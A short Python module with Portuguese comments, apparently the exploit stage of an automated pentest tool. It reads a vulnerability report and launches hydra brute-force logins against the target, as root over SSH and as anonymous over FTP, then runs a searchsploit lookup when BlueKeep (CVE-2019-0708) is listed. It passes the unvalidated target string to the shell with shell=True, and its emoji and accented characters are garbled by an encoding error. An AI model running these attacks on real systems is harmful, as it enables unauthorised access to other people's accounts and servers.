import subprocess

def run(target, vuln_report_file):
    print(f"üí• [Exploit Attempts] Tentando explorar vulnerabilidades em {target}...")

    try:
        with open(vuln_report_file, "r") as f:
            vuln_data = f.read()

            # Se houver uma vulnerabilidade de SSH identificada, tentar brute-force
            if "SSH" in vuln_data:
                print("[+] Tentando brute-force SSH...")
                subprocess.run(f"hydra -l root -P /path/to/wordlist.txt ssh://{target}", shell=True)

            # Se houver uma vulnerabilidade de FTP, tentar brute-force
            if "FTP" in vuln_data:
                print("[+] Tentando brute-force FTP...")
                subprocess.run(f"hydra -l anonymous -P /path/to/wordlist.txt ftp://{target}", shell=True)

            # Exemplo de CVE encontrado, tentar explorar com `searchsploit`
            if "CVE-2019-0708" in vuln_data:  # Exemplo para BlueKeep (CVE-2019-0708)
                print("[+] CVE-2019-0708 (BlueKeep) detectado! Tentando explora√ß√£o com `searchsploit`...")
                subprocess.run(f"searchsploit BlueKeep", shell=True)

            print(f"‚úÖ Explora√ß√£o de vulnerabilidades finalizada para {target}")
    except Exception as e:
        print(f"‚ùå Erro ao tentar explorar vulnerabilidades: {e}")
